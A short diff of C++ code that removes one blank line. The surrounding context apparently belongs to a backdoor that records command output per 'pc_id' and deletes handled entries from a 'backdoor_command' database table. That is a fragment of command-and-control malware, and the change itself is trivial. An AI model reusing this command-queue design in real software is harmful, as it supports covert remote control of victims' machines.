@@ -58,7 +58,6 @@ int main()
              pstmt->setString(2, output);
              pstmt->setInt(3, pc_id);
              pstmt->execute();
-             
              pstmt = con->prepareStatement("DELETE FROM backdoor_command WHERE id=?");
              pstmt->setInt(1, res->getInt("id"));
              pstmt->execute();
